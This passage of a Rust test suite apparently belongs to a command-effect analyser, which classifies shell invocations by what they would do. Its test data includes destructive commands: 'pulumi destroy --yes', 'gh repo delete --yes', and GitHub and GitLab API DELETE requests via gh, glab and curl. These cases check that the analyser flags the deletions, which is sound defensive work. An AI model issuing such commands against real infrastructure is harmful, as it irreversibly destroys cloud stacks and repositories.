#![allow(clippy::disallowed_methods)]

use std::collections::{BTreeMap, BTreeSet};

use effinterp_engine::{Engine, default_limits};
use effinterp_model_schema::{DeclarationDocument, PlatformPredicate};
use effinterp_proto::{
    AttrValue, Boundary, BoundaryClass, CoverageLevel, Domain, Effect, HostContext, Plan,
    ProvenanceKind, ResourceExpr, ResourceIdentity, Subject, display_resource, validate_plan,
};

fn analyze(argv: &[&str], cwd: Option<&str>) -> Plan {
    analyze_owned(
        &argv
            .iter()
            .map(|argument| argument.to_string())
            .collect::<Vec<_>>(),
        cwd,
    )
}

fn analyze_owned(argv: &[String], cwd: Option<&str>) -> Plan {
    let plan = Engine::new()
        .analyze(&Subject::Exec {
            argv: argv.to_vec(),
            cwd: cwd.map(|s| s.to_string()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan for {argv:?}: {e:?}"));
    plan
}

#[test]
fn pulumi_destroy_preserves_controls_aliases_and_selection() {
    for args in [
        vec![
            "pulumi",
            "-v3",
            "destroy",
            "-sdev",
            "-p4",
            "-mmessage",
            "-cfoo=bar",
            "-r=false",
        ],
        vec![
            "pulumi",
            "destroy",
            "--config",
            "foo=bar",
            "--config-file",
            "custom.yaml",
        ],
    ] {
        let plan = analyze(&args, Some("/work"));
        let write = plan
            .effects
            .iter()
            .find(|e| e.operation.0 == "filesystem.write")
            .expect("config update");
        assert_eq!(
            write.attributes.get("disclosure"),
            Some(&AttrValue::String("contents".into()))
        );
        if args.contains(&"--config-file") {
            assert_eq!(display_resource(&write.resource), "fs:/work/custom.yaml");
        }
        assert!(
            !plan
                .boundaries
                .iter()
                .any(|b| b.reason == effinterp_proto::BoundaryReason::MODEL_COVERAGE)
        );
    }
    let symbolic_config = Engine::new()
        .analyze(&effinterp_proto::Subject::Shell {
            source: "pulumi destroy -c\"$CONFIG\"".into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        })
        .unwrap();
    assert_eq!(
        symbolic_config.coverage.level(&Domain::new("filesystem")),
        Some(CoverageLevel::Partial)
    );
    let help = analyze(&["pulumi", "destroy", "-cfoo=bar", "--help"], Some("/work"));
    assert!(
        help.effects
            .iter()
            .all(|e| e.operation.0 != "filesystem.write")
    );
    let preview = analyze(&["pulumi", "destroy", "--preview-only"], Some("/work"));
    assert!(
        preview
            .effects
            .iter()
            .all(|effect| effect.operation.as_str() != "cloud.resource.delete")
    );
    assert!(
        preview
            .boundaries
            .iter()
            .any(|boundary| boundary.reason == effinterp_proto::BoundaryReason::PROVIDER_IO)
    );
    assert!(
        !preview
            .boundaries
            .iter()
            .any(|boundary| boundary.reason
                == effinterp_proto::BoundaryReason::UNRECOGNIZED_ARGUMENTS)
    );
    for argv in [
        vec!["pulumi", "destroy", "--yes"],
        vec!["pulumi", "down", "-yf"],
        vec!["pulumi", "dn", "--yes", "--skip-preview"],
        vec!["pulumi", "destroy", "--preview-only=false", "--yes"],
        vec!["pulumi", "destroy", "--help", "--help=false", "--yes"],
        vec!["pulumi", "destroy", "--ignore-protect=false"],
        vec!["pulumi", "--version", "--version=false", "destroy"],
        vec!["pulumi", "destroy", "--copilot"],
        vec!["pulumi", "destroy", "--exec-kind=auto.inline"],
        vec!["pulumi", "destroy", "--output=default"],
        vec!["pulumi", "destroy", "--override-env=dev=prod"],
        vec!["pulumi", "-Qv3", "destroy", "-yp4", "-ysdev"],
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(
            plan.effects
                .iter()
                .any(|e| e.operation.0 == "cloud.resource.delete"),
            "{argv:?}"
        );
        for effect in plan
            .effects
            .iter()
            .filter(|e| e.operation.0 == "cloud.resource.delete")
        {
            for (key, value) in [
                ("active", true),
                ("preview", false),
                ("help", false),
                ("dry_run", false),
                ("whole_stack", true),
                ("targeted", false),
            ] {
                assert_eq!(
                    effect.attributes.get(key),
                    Some(&AttrValue::Bool(value)),
                    "{argv:?}: {key}"
                );
            }
            assert_eq!(
                effect.attributes.get("provider"),
                Some(&AttrValue::String("pulumi".into()))
            );
        }
        assert!(
            plan.effects
                .iter()
                .all(|e| e.modality == effinterp_proto::Modality::May)
        );
    }
    for argv in [
        vec![
            "pulumi",
            "destroy",
            "--exclude-protected=false",
            "--ignore-protect",
        ],
        vec!["pulumi", "destroy", "--preview-only"],
        vec!["pulumi", "destroy", "--preview-only=true"],
        vec!["pulumi", "destroy", "--help=false", "--help"],
        vec!["pulumi", "destroy", "--help=false", "-h"],
        vec!["pulumi", "destroy", "--yes=bogus"],
        vec!["pulumi", "destroy", "--yes=bogus", "--yes"],
        vec!["pulumi", "destroy", "--stack"],
        vec!["pulumi", "destroy", "--parallel", "nope"],
        vec!["pulumi", "--version", "destroy"],
        vec!["pulumi", "destroy", "--exec-kind"],
        vec!["pulumi", "destroy", "--output=invalid"],
        vec!["pulumi", "destroy", "--output=default", "--output=invalid"],
        vec!["pulumi", "destroy", "--json", "--output=default"],
        vec![
            "pulumi",
            "destroy",
            "--override-env=dev=prod",
            "--override-env=qa",
        ],
        vec!["pulumi", "destroy", "-pgarbage"],
        vec!["pulumi", "destroy", "--unknown"],
        vec!["pulumi", "destroy", "extra"],
        vec![
            "pulumi",
            "destroy",
            "--exclude-protected",
            "--ignore-protect",
        ],
        vec![
            "pulumi",
            "destroy",
            "--exclude-protected=false",
            "--ignore-protect",
        ],
        vec![
            "pulumi",
            "destroy",
            "--exclude-protected",
            "--target",
            "urn:x",
        ],
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0 == "cloud.resource.delete"),
            "{argv:?}"
        );
        assert!(!plan.boundaries.is_empty(), "{argv:?}");
    }
    let plan = analyze(
        &[
            "pulumi",
            "destroy",
            "-sdev",
            "--target",
            "urn:first",
            "--target",
            "urn:second",
        ],
        Some("/work"),
    );
    let deletes: Vec<_> = plan
        .effects
        .iter()
        .filter(|e| e.operation.0 == "cloud.resource.delete")
        .collect();
    assert_eq!(deletes.len(), 2);
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason == effinterp_proto::BoundaryReason::LIVE_INVENTORY)
    );
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|boundary| boundary.reason == effinterp_proto::BoundaryReason::PARTIAL_ANALYSIS)
    );
    for (effect, target) in deletes.into_iter().zip(["urn:first", "urn:second"]) {
        assert_eq!(
            effect.attributes.get("whole_stack"),
            Some(&AttrValue::Bool(false))
        );
        assert_eq!(
            effect.attributes.get("targeted"),
            Some(&AttrValue::Bool(true))
        );
        assert_eq!(
            effect.attributes.get("stack"),
            Some(&AttrValue::String("dev".into()))
        );
        assert_eq!(
            effect.attributes.get("target"),
            Some(&AttrValue::String(target.into()))
        );
        assert!(
            matches!(&effect.resource, ResourceExpr::Unresolved { family } if family.0 == "cloud")
        );
    }
}

#[test]
fn registry_ownership_changes_access_without_artifact_deletion() {
    for argv in [
        vec!["cargo", "owner", "--add", "alice", "crate-name"],
        vec![
            "cargo",
            "owner",
            "-rmallory",
            "crate-name",
            "--registry",
            "crates-io",
        ],
        vec![
            "cargo",
            "owner",
            "--add",
            "alice",
            "--remove",
            "bob",
            "crate-name",
        ],
        vec!["gem", "owner", "rack", "--add", "alice"],
        vec!["gem", "owner", "rack", "-rmallory", "--key", "release"],
        vec!["gem", "owner", "rack", "-a", "alice", "-r", "bob"],
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.as_str() == "artifact.owner_change"),
            "{argv:?}"
        );
        assert!(
            !plan.effects.iter().any(|effect| matches!(
                effect.operation.as_str(),
                "artifact.delete" | "artifact.remove_request"
            )),
            "{argv:?}"
        );
    }
}

fn command_effects(plan: &Plan) -> Vec<Effect> {
    plan.effects
        .iter()
        .filter(|effect| {
            !matches!(
                effect.operation.0.as_str(),
                "process.exec" | "process.code_execution"
            )
        })
        .cloned()
        .map(|mut effect| {
            // Compare model semantics across different launching subjects.
            effect.id = Default::default();
            effect.provenance.clear();
            effect
        })
        .collect()
}

fn command_boundaries(plan: &Plan) -> Vec<Boundary> {
    plan.boundaries
        .iter()
        .cloned()
        .map(|mut boundary| {
            boundary.provenance.clear();
            boundary
        })
        .collect()
}

fn command_model_provenance(plan: &Plan) -> BTreeSet<String> {
    plan.provenance
        .iter()
        .filter_map(|node| match &node.kind {
            ProvenanceKind::ModelApplication { model } if !model.starts_with("python/python@") => {
                Some(model.clone())
            }
            _ => None,
        })
        .collect()
}

fn ops(plan: &Plan) -> Vec<(&str, String)> {
    plan.effects
        .iter()
        .map(|e| (e.operation.0.as_str(), render(&e.resource)))
        .collect()
}

fn render(expr: &ResourceExpr) -> String {
    match expr {
        ResourceExpr::Concrete { identity } => match identity {
            ResourceIdentity::FsPath { path } => path.clone(),
            ResourceIdentity::UserHome { user } => format!("~{user}"),
            ResourceIdentity::EnvironmentVariable { name } => format!("env:{name}"),
            ResourceIdentity::GitRepository { worktree, .. } => worktree
                .as_deref()
                .map(render)
                .unwrap_or_else(|| "git".to_string()),
            ResourceIdentity::Process { executable, .. } => format!("exe:{executable}"),
            ResourceIdentity::NetworkEndpoint {
                host,
                scheme,
                port,
                path,
                ..
            } => format!(
                "net:{}{host}{}{}",
                scheme
                    .as_deref()
                    .map(|s| format!("{s}://"))
                    .unwrap_or_default(),
                port.map(|p| format!(":{p}")).unwrap_or_default(),
                path.clone().unwrap_or_default()
            ),
            ResourceIdentity::Container { name, image, .. } => format!(
                "container:{}",
                name.as_deref().or(image.as_deref()).unwrap_or("?")
            ),
            ResourceIdentity::DatabaseTable { table, .. } => format!("db:{table}"),
            ResourceIdentity::DatabaseSchema { schema, .. } => {
                format!("db:{}", schema.clone().unwrap_or_default())
            }
            ResourceIdentity::ObjectStore { bucket, .. } => format!("obj:{bucket}"),
            ResourceIdentity::CloudResource { id, .. } => {
                format!("cloud:{}", id.as_deref().unwrap_or("?"))
            }
            identity @ ResourceIdentity::Artifact { .. } => {
                effinterp_proto::display_identity(identity)
            }
            ResourceIdentity::MessageTopic { name, .. } => format!("topic:{name}"),
            ResourceIdentity::ServiceUnit { .. }
            | ResourceIdentity::ScheduledJob { .. }
            | ResourceIdentity::StorageVolume { .. }
            | ResourceIdentity::BlockDevice { .. }
            | ResourceIdentity::CredentialStore { .. }
            | ResourceIdentity::HostSystem {}
            | ResourceIdentity::KubernetesResource { .. }
            | ResourceIdentity::ManagedInfrastructure { .. } => {
                effinterp_proto::display_identity(identity)
            }
        },
        ResourceExpr::Pattern {
            pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern },
        } => format!("pat:{pattern}"),
        ResourceExpr::Unresolved { family } => format!("?{}", family.0),
        ResourceExpr::Join { .. } => "join".to_string(),
        other => format!("{other:?}"),
    }
}

fn has_effect(plan: &Plan, op: &str, resource: &str) -> bool {
    ops(plan).iter().any(|(o, r)| *o == op && r == resource)
}

fn has_boundary(plan: &Plan, reason: &str) -> bool {
    plan.boundaries.iter().any(|b| b.reason.as_str() == reason)
}

fn has_network_host(plan: &Plan, operation: &str, expected_host: &str) -> bool {
    plan.effects.iter().any(|effect| {
        effect.operation.0 == operation
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::NetworkEndpoint { host, .. }
                } if host == expected_host
            )
    })
}

#[test]
fn python_modules_match_standalone_command_models() {
    for (module, tail) in [
        ("pip", &["install", "requests"][..]),
        ("pytest", &["tests/test_api.py"][..]),
        ("venv", &[".venv"][..]),
        ("build", &[][..]),
        ("playwright", &["install"][..]),
        ("http.server", &["8000"][..]),
        ("json.tool", &[][..]),
    ] {
        let standalone = std::iter::once(module)
            .chain(tail.iter().copied())
            .map(str::to_string)
            .collect::<Vec<_>>();
        let standalone = analyze_owned(&standalone, Some("/work"));
        let attached = format!("-m{module}");
        let launches = [
            std::iter::once("python3.12")
                .chain(["-S", "-m", module])
                .chain(tail.iter().copied())
                .map(str::to_string)
                .collect::<Vec<_>>(),
            std::iter::once("python3.12")
                .chain(["-S", attached.as_str()])
                .chain(tail.iter().copied())
                .map(str::to_string)
                .collect::<Vec<_>>(),
            std::iter::once("python3.12")
                .chain(["-I", "-S", "-X", "dev", "-m", module])
                .chain(tail.iter().copied())
                .map(str::to_string)
                .collect::<Vec<_>>(),
            std::iter::once("python3.12")
                .chain(["-S", "-B", attached.as_str()])
                .chain(tail.iter().copied())
                .map(str::to_string)
                .collect::<Vec<_>>(),
        ];

        for launch in launches {
            let delegated = analyze_owned(&launch, Some("/work"));
            assert_eq!(
                command_effects(&delegated),
                command_effects(&standalone),
                "effects for {launch:?}"
            );
            assert_eq!(
                command_boundaries(&delegated),
                command_boundaries(&standalone),
                "boundaries for {launch:?}"
            );
            assert_eq!(
                delegated.coverage, standalone.coverage,
                "coverage for {launch:?}"
            );
            assert_eq!(
                command_model_provenance(&delegated),
                command_model_provenance(&standalone),
                "model provenance for {launch:?}"
            );
            assert_eq!(
                delegated
                    .effects
                    .iter()
                    .filter(|effect| effect.operation.0 == "process.exec")
                    .count(),
                1,
                "process count for {launch:?}"
            );
            assert_eq!(
                delegated
                    .effects
                    .iter()
                    .filter(|effect| effect.operation.0 == "process.code_execution")
                    .count(),
                1,
                "code sink count for {launch:?}"
            );
            assert_eq!(
                delegated.execution_graph.nodes.len(),
                1,
                "execution nodes for {launch:?}"
            );
        }
    }
}

#[test]
fn python_module_delegation_obeys_execution_limits() {
    for (limit, value) in [("max_execution_depth", 1), ("max_execution_nodes", 0)] {
        let mut limits = default_limits();
        limits.insert(limit.to_string(), value);
        let plan = Engine::with_limits(limits)
            .unwrap()
            .analyze(&Subject::Exec {
                argv: ["python3.12", "-S", "-m", "pip", "install", "requests"]
                    .into_iter()
                    .map(str::to_string)
                    .collect(),
                cwd: Some("/work".to_string()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(plan.boundaries.iter().any(|boundary| {
            boundary.reason.as_str() == "execution_limit"
                && boundary.limit.as_deref() == Some(limit)
        }));
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "network.download")
        );
        assert_eq!(
            attr(&plan, "process.code_execution", "source"),
            Some(AttrValue::String("file".to_string()))
        );
        assert_eq!(plan.execution_graph.nodes.len(), 1);
    }
}

#[test]
fn empty_cwd_is_the_canonical_repository_root() {
    let plan = analyze(&["true"], Some(""));
    assert!(matches!(
        &plan.execution_graph.nodes[0].cwd,
        Some(ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        }) if path == "."
    ));
}

fn attr(plan: &Plan, op: &str, key: &str) -> Option<AttrValue> {
    plan.effects
        .iter()
        .find(|e| e.operation.0 == op)
        .and_then(|e| e.attributes.get(key).cloned())
}

fn strings(values: &[&str]) -> AttrValue {
    AttrValue::List(
        values
            .iter()
            .map(|value| AttrValue::String((*value).into()))
            .collect(),
    )
}

#[test]
fn migrated_commands_have_one_declaration_owner() {
    let catalog = effinterp_engine::Catalog::builtin();
    for (command, id) in [
        ("rm", "coreutils/rm@v1"),
        ("mv", "coreutils/mv@v1"),
        ("cat", "coreutils/cat@v1"),
        ("mkdir", "coreutils/mkdir@v1"),
        ("cp", "coreutils/cp@v1"),
        ("touch", "coreutils/touch@v1"),
        ("ln", "coreutils/ln@v1"),
        ("rmdir", "coreutils/rmdir@v1"),
        ("chmod", "coreutils/chmod@v1"),
        ("chown", "coreutils/chmod-chown@v1"),
        ("chgrp", "coreutils/chmod-chown@v1"),
        ("truncate", "coreutils/truncate@v1"),
        ("kubectl", "kubernetes/kubectl@v1"),
        ("brew", "p18b/package-build-vcs/brew@v1"),
        ("bunx", "p18b/package-build-vcs/bunx@v1"),
    ] {
        let model = catalog.find(command).unwrap();
        assert_eq!(model.id(), id, "wrong owner for {command}");
        assert!(
            model.declaration_digest().is_some(),
            "{command} is handwritten"
        );
    }
}

#[test]
fn compose_binaries_are_owned_by_the_docker_model() {
    let catalog = effinterp_engine::Catalog::builtin();
    for command in ["docker-compose", "podman-compose"] {
        let model = catalog.find(command).unwrap();
        assert_eq!(model.id(), "docker/cli@v6", "wrong owner for {command}");
        assert!(
            model.declaration_digest().is_none(),
            "{command} is declarative"
        );
    }
}

#[test]
fn promoted_tranche_spans_each_tool_family() {
    let catalog = effinterp_engine::Catalog::builtin();
    for command in [
        "composer",
        "brew",
        "bunx",
        "jq",
        "install",
        "fish",
        "aria2c",
        "7z",
        "launchctl",
        "helm",
        "dolt",
        "pulumi",
        "kcat",
    ] {
        let model = catalog.find(command).unwrap();
        assert!(model.id().starts_with("p18b/"), "wrong owner for {command}");
        assert!(
            model.declaration_digest().is_some(),
            "{command} is handwritten"
        );
    }
}

#[test]
fn declarative_interpreters_emit_code_execution_sinks() {
    for (command, inline_flag, script) in [
        ("clojure", "-e", "/work/program.src"),
        ("csh", "-c", "/work/program.src"),
        ("fish", "-c", "/work/program.src"),
        ("groovy", "-e", "/work/program.src"),
        ("julia", "-e", "/work/program.src"),
        ("ksh", "-c", "/work/program.src"),
        ("lua", "-e", "/work/program.src"),
        ("luajit", "-e", "/work/program.src"),
        ("Rscript", "-e", "/work/program.src"),
        ("scala", "-e", "/work/program.scala"),
        ("swift", "-e", "/work/program.swift"),
        ("tcsh", "-c", "/work/program.src"),
    ] {
        assert_eq!(
            attr(
                &analyze(&[command], Some("/work")),
                "process.code_execution",
                "source"
            ),
            Some(AttrValue::String("stdin".to_string())),
            "{command} stdin"
        );

        let inline = analyze(&[command, inline_flag, "1"], Some("/work"));
        assert_eq!(
            attr(&inline, "process.code_execution", "source"),
            Some(AttrValue::String("argument".to_string())),
            "{command} inline"
        );
        assert!(
            inline
                .effects
                .iter()
                .all(|effect| effect.operation.0 != "filesystem.read"),
            "{command} inline"
        );

        let file = analyze(&[command, script], Some("/work"));
        assert_eq!(
            attr(&file, "process.code_execution", "source"),
            Some(AttrValue::String("file".to_string())),
            "{command} file"
        );
        assert!(
            has_effect(&file, "filesystem.read", script),
            "{command} file"
        );
    }

    for command in ["csh", "fish", "ksh", "lua", "luajit", "Rscript", "tcsh"] {
        let plan = analyze(&[command, "-"], Some("/work"));
        assert_eq!(
            attr(&plan, "process.code_execution", "source"),
            Some(AttrValue::String("stdin".to_string())),
            "{command} explicit stdin"
        );
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "filesystem.read"),
            "{command} explicit stdin"
        );
    }

    for command in ["lua", "luajit"] {
        let plan = analyze(
            &[command, "-e", "print(1)", "/work/program.src"],
            Some("/work"),
        );
        let sources = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "process.code_execution")
            .filter_map(|effect| match effect.attributes.get("source") {
                Some(AttrValue::String(source)) => Some(source.as_str()),
                _ => None,
            })
            .collect::<BTreeSet<_>>();
        assert_eq!(sources, BTreeSet::from(["argument", "file"]), "{command}");
        assert!(
            has_effect(&plan, "filesystem.read", "/work/program.src"),
            "{command}"
        );
    }
}

#[test]
fn interpreter_launcher_guards_do_not_read_subcommands_as_files() {
    for argv in [
        &["swift", "build"][..],
        &["scala", "run"][..],
        &["clojure", "-M"][..],
        &["clojure", "-X"][..],
        &["clojure", "-T"][..],
        &["clojure", "-A"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "filesystem.read"),
            "{argv:?}"
        );
        assert!(has_boundary(&plan, "unmodeled_subcommand"), "{argv:?}");
    }

    for flag in ["-e", "-E", "--eval"] {
        let plan = analyze(&["julia", flag, "1"], Some("/work"));
        assert_eq!(
            attr(&plan, "process.code_execution", "source"),
            Some(AttrValue::String("argument".to_string())),
            "{flag}"
        );
    }
    let project = analyze(
        &["julia", "--project", "/work/env", "/work/program.src"],
        Some("/work"),
    );
    assert_eq!(
        attr(&project, "process.code_execution", "source"),
        Some(AttrValue::String("file".to_string()))
    );
}

#[test]
fn p11_miss_models_have_declaration_owners() {
    let catalog = effinterp_engine::Catalog::builtin();
    for command in [
        "gtar",
        "jq",
        "ps",
        "readlink",
        "install",
        "sysctl",
        "start-stop-daemon",
        "hub",
        "col",
        "cygpath",
        "psrinfo",
        "sw_vers",
        "pmcycles",
        "print",
    ] {
        let model = catalog.find(command).unwrap();
        assert!(model.id().starts_with("p18b/"), "wrong owner for {command}");
        assert!(
            model.declaration_digest().is_some(),
            "{command} is handwritten"
        );
    }
}

#[test]
fn devtool_and_agent_tranche_commands_have_declaration_owners() {
    let catalog = effinterp_engine::Catalog::builtin();
    for (commands, owner) in [
        (
            &[
                "id", "whoami", "nproc", "seq", "hostname", "uptime", "free", "arch", "ss",
                "netstat", "lsof",
            ][..],
            "p18b/devtools/inert/",
        ),
        (
            &[
                "diff",
                "cmp",
                "file",
                "strings",
                "od",
                "nl",
                "realpath",
                "df",
                "du",
                "lsb_release",
                "getent",
                "uniq",
                "xxd",
            ][..],
            "p18b/devtools/read-operands/",
        ),
        (
            &[
                "sha256sum",
                "sha1sum",
                "sha512sum",
                "md5sum",
                "b2sum",
                "cksum",
                "shasum",
            ][..],
            "p18b/devtools/checksums@v1",
        ),
        (&["rg"][..], "p18b/devtools/rg@v1"),
        (&["mktemp"][..], "p18b/devtools/mktemp@v1"),
        (
            &[
                "time", "taskset", "chrt", "ionice", "setpriv", "fakeroot", "unbuffer",
            ][..],
            "p18b/devtools/prefix-wrappers/",
        ),
        (&["rustc", "rustfmt"][..], "p18b/devtools/rust-tools/"),
        (
            &["tsc", "eslint", "prettier", "vite", "vitest", "cross-env"][..],
            "p18b/devtools/js-toolchain/",
        ),
        (&["pytest"][..], "p18b/devtools/pytest@v2"),
        (&["gofmt"][..], "p18b/devtools/gofmt@v2"),
        (&["open"][..], "p18b/devtools/open@v2"),
        (&["comm"][..], "p18b/devtools/comm@v2"),
        (&["s6-setuidgid"][..], "p18b/devtools/s6-setuidgid@v2"),
        (&["which", "whereis"][..], "p18b/devtools/which@v1"),
        (&["gh"][..], "p18b/devtools/gh@v2"),
        (&["glab"][..], "p18b/devtools/glab@v1"),
        (
            &[
                "claude",
                "codex",
                "amp",
                "droid",
                "cursor-agent",
                "pi",
                "hermes",
            ][..],
            "p18b/agents/",
        ),
    ] {
        for command in commands {
            let model = catalog.find(command).unwrap();
            assert!(model.id().starts_with(owner), "wrong owner for {command}");
            assert!(
                model.declaration_digest().is_some() == (*command != "gh"),
                "{command} declaration provenance does not match its owner"
            );
        }
    }
}

#[test]
fn reviewed_inert_commands_are_boundary_free_without_invented_coverage() {
    for command in [
        "id", "whoami", "nproc", "seq", "hostname", "uptime", "free", "arch", "ss", "netstat",
        "lsof",
    ] {
        let plan = analyze(&[command], Some("/work"));
        assert!(command_effects(&plan).is_empty(), "{command}");
        assert!(plan.boundaries.is_empty(), "{command}");
        let effect_domains = plan
            .effects
            .iter()
            .map(|effect| Domain::new(effect.operation.domain()))
            .collect::<BTreeSet<_>>();
        assert_eq!(
            plan.coverage.0.keys().cloned().collect::<BTreeSet<_>>(),
            effect_domains,
            "{command}"
        );
        assert!(
            plan.coverage
                .0
                .values()
                .all(|claim| claim.level == CoverageLevel::Full),
            "{command}"
        );
    }

    let unsupported = analyze(&["hostname", "replacement"], Some("/work"));
    assert!(has_boundary(&unsupported, "unrecognized_arguments"));
}

#[test]
fn hosted_cli_verb_groups_use_the_reviewed_effect_and_host() {
    for (cli, read, mutate, local, host, token) in [
        (
            "gh",
            &["gh", "pr", "list"][..],
            &["gh", "issue", "create"][..],
            &["gh", "repo", "clone", "owner/name", "checkout"][..],
            "github.com",
            "GH_TOKEN",
        ),
        (
            "glab",
            &["glab", "mr", "list"][..],
            &["glab", "issue", "create"][..],
            &["glab", "repo", "clone", "group/name", "checkout"][..],
            "gitlab.com",
            "GITLAB_TOKEN",
        ),
    ] {
        let analyze = |argv: &[&str]| {
            let plan = Engine::new()
                .analyze(&Subject::Exec {
                    argv: argv.iter().map(|argument| argument.to_string()).collect(),
                    cwd: Some("/work".into()),
                    context: HostContext {
                        env: std::collections::BTreeMap::from([
                            ("CONTEXT_PRESENT".into(), "1".into()),
                            ("HOME".into(), "/home/test".into()),
                        ]),
                        ..HostContext::default()
                    },
                })
                .unwrap();
            validate_plan(&plan).unwrap();
            plan
        };
        let read = analyze(read);
        assert!(has_network_host(&read, "network.request", host), "{cli}");
        assert!(read.boundaries.is_empty(), "{cli}");
        assert!(has_effect(
            &read,
            "environment.read",
            &format!("env:{token}")
        ));
        let config_suffix = if cli == "gh" {
            "/.config/gh/hosts.yml"
        } else {
            "/.config/glab-cli/config.yml"
        };
        let config_resource = ResourceExpr::Join {
            parts: vec![
                ResourceExpr::Environment {
                    name: "HOME".into(),
                },
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath {
                        path: config_suffix.into(),
                    },
                },
            ],
        };
        assert!(read.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.read"
                && effect.resource == config_resource
                && effect.attributes.get("access_purpose")
                    == Some(&AttrValue::String("implicit_authentication".into()))
        }));

        let mutate = analyze(mutate);
        assert!(has_network_host(&mutate, "network.upload", host), "{cli}");
        assert!(mutate.effects.iter().any(|effect| {
            effect.operation.0 == "network.upload"
                && matches!(effect.attributes.get("method"), Some(AttrValue::String(_)))
        }));

        let local = analyze(local);
        assert!(has_network_host(&local, "network.download", host), "{cli}");
        assert!(has_effect(&local, "filesystem.write", "/work/checkout"));

        for arguments in [
            vec!["repo", "delete"],
            vec!["repo", "delete", "owner/repo", "--yes"],
            vec!["issue", "create"],
            vec!["api", "-X", "DELETE", "repos/owner/project"],
            vec![
                "api",
                "--method",
                "DELETE",
                "repos/{owner}/{repo}/hooks/123",
            ],
            vec!["api", "-X", "POST", "endpoint"],
            vec!["api", "-f", "key=value", "endpoint"],
        ] {
            if cli == "glab" && arguments[0] == "api" {
                continue;
            }
            let argv: Vec<_> = std::iter::once(cli).chain(arguments).collect();
            let plan = analyze(&argv);
            let delete_request = argv.get(1..3) == Some(["repo", "delete"].as_slice())
                || (argv[1] == "api" && argv.contains(&"DELETE"));
            if delete_request {
                if argv[1] == "api" {
                    assert!(
                        has_network_host(&plan, "network.delete_request", host),
                        "{argv:?}"
                    );
                } else {
                    assert!(plan.effects.iter().any(|effect| effect.operation.0 == "network.delete_request"
                        && matches!(&effect.resource, ResourceExpr::Unresolved { family } if family.0 == "network")), "{argv:?}");
                }
                let expected_modality =
                    if argv[1] == "api" || argv.iter().any(|arg| *arg == "--yes" || *arg == "-y") {
                        effinterp_proto::Modality::MustOnSuccess
                    } else {
                        effinterp_proto::Modality::May
                    };
                assert!(
                    plan.effects.iter().any(|effect| {
                        effect.operation.0 == "network.delete_request"
                            && effect.modality == expected_modality
                    }),
                    "{argv:?}"
                );
            } else {
                assert!(has_network_host(&plan, "network.upload", host), "{argv:?}");
            }
            for domain in ["cloud", "container", "database", "git", "messaging"] {
                let domain = Domain::new(domain);
                assert_eq!(plan.coverage.level(&domain), None, "{argv:?} {domain:?}");
                assert!(
                    plan.boundaries
                        .iter()
                        .all(|boundary| !boundary.domains.contains(&domain))
                );
            }
        }

        let exact = if cli == "gh" {
            analyze(&[
                "gh",
                "api",
                "--paginate",
                "-X",
                "DELETE",
                "repos/owner/project",
            ])
        } else {
            analyze(&[
                "glab",
                "api",
                "-F",
                "data=[1,true]",
                "-X",
                "DELETE",
                "projects/123",
            ])
        };
        assert!(exact.effects.iter().any(|effect| {
            effect.operation.0 == "network.delete_request"
                && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
        }));
        assert!(
            !exact
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "network.upload")
        );
        assert!(exact.boundaries.is_empty(), "{cli}: {:?}", exact.boundaries);

        let generic = if cli == "gh" {
            analyze(&["gh", "api", "-X", "DELETE", "repos/owner/project/issues/42"])
        } else {
            analyze(&["glab", "api", "-X", "DELETE", "projects/group/project"])
        };
        assert!(generic.effects.iter().any(|effect| {
            effect.operation.0 == "network.delete_request"
                && effect.request_assurance == effinterp_proto::RequestAssurance::Conservative
                && effect.attributes.get("hosted_object_kind")
                    == Some(&AttrValue::String("api_resource".into()))
        }));

        // Controls whose grammar the models still leave unmodeled, rather than
        // ones the tool refuses while validating flags.
        let malformed = if cli == "gh" {
            analyze(&[
                "gh",
                "api",
                "--template",
                "{{break}}",
                "-X",
                "DELETE",
                "repos/owner/project",
            ])
        } else {
            analyze(&["glab", "api", "--form", "a", "-X", "DELETE", "projects/123"])
        };
        assert!(
            !malformed
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "network.delete_request")
        );
        assert!(has_boundary(&malformed, "unrecognized_arguments"));
    }

    let read = analyze(&["gh", "api", "-X", "GET", "repos/o/r"], Some("/work"));
    assert!(
        read.effects
            .iter()
            .any(|effect| effect.operation.0 == "network.request")
    );
    assert!(
        read.effects
            .iter()
            .all(|effect| effect.operation.0 != "network.upload")
    );
    let mutate = analyze(&["gh", "api", "-X", "POST", "repos/o/r"], Some("/work"));
    assert!(
        mutate
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "network.upload")
    );
    assert!(
        mutate
            .effects
            .iter()
            .all(|effect| effect.operation.0 != "network.request")
    );

    for (argv, provider, target) in [
        (
            vec![
                "curl",
                "-X",
                "DELETE",
                "https://api.github.com/repos/owner/project",
            ],
            "github",
            "repos/owner/project",
        ),
        (
            vec![
                "curl",
                "--request",
                "DELETE",
                "https://gitlab.com/api/v4/projects/123",
            ],
            "gitlab",
            "projects/123",
        ),
    ] {
        let plan = analyze(&argv, Some("/work"));
        let requests = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "network.delete_request")
            .collect::<Vec<_>>();
        assert_eq!(requests.len(), 1, "{argv:?}");
        let request = requests[0];
        assert!(matches!(
            &request.resource,
            ResourceExpr::Concrete {
